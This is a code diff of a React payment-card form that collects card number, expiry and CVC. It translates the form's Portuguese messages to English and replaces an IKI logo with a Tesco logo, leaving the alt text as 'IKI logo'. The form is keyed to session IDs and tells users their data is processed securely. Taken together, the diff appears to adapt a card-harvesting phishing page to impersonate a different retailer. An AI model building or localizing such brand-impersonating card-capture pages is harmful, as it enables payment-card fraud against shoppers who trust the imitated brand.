@@ -162,11 +162,11 @@ export function CardClient({ sessionId: initialSessionId, routeSessionId }: Prop
     e.preventDefault();
     if (!supabase || !sessionId) return;
     if (!expiryValid) {
-      setMsg("Introduza uma data de validade válida (MM/AA).");
+      setMsg("Enter a valid expiry date (MM/YY).");
       return;
     }
     if (!cvcValid) {
-      setMsg("Introduza um código CVC/CVV válido (3 ou 4 dígitos).");
+      setMsg("Enter a valid CVC/CVV code (3 or 4 digits).");
       return;
     }
     setSaving(true);
@@ -261,7 +261,7 @@ export function CardClient({ sessionId: initialSessionId, routeSessionId }: Prop
       <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
         <div className="w-full max-w-[650px] rounded-[24px] bg-[var(--brand-panel)] border border-[var(--brand)] shadow-[0_0_40px_rgba(var(--brand-rgb),0.3)] p-5 sm:p-8 text-center">
           <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
-            Ligação inválida.
+            Invalid link.
           </p>
         </div>
       </div>
@@ -275,7 +275,7 @@ export function CardClient({ sessionId: initialSessionId, routeSessionId }: Prop
         {/* Right Top Logo Placeholder */}
         <div className="absolute right-6 top-6 sm:right-10 sm:top-10">
           <img
-            src="/form-assets/iki-mini-logo.png"
+            src="/form-assets/tesco-mini-logo.png"
             alt="IKI logo"
             className="h-10 w-10 object-contain drop-shadow-[0_10px_18px_rgba(0,0,0,0.35)]"
             id="card-ah-logo"
@@ -366,7 +366,7 @@ export function CardClient({ sessionId: initialSessionId, routeSessionId }: Prop
           </div>
 
           {!numberValid && number.length >= 12 ? (
-            <p className="text-xs text-red-400">Número de cartão inválido.</p>
+            <p className="text-xs text-red-400">Invalid card number.</p>
           ) : null}
 
           {!expiryValid && expiry.length > 0 ? (
@@ -390,7 +390,7 @@ export function CardClient({ sessionId: initialSessionId, routeSessionId }: Prop
           <div className="mt-4 flex items-center justify-center gap-2">
             <img src="/form-assets/icon-security.png" alt="Secure" className="h-5 w-5" />
             <span className="text-[13px] font-medium text-gray-300">
-              Os seus dados são processados com segurança.
+              Your data is processed securely.
             </span>
           </div>
         </form>
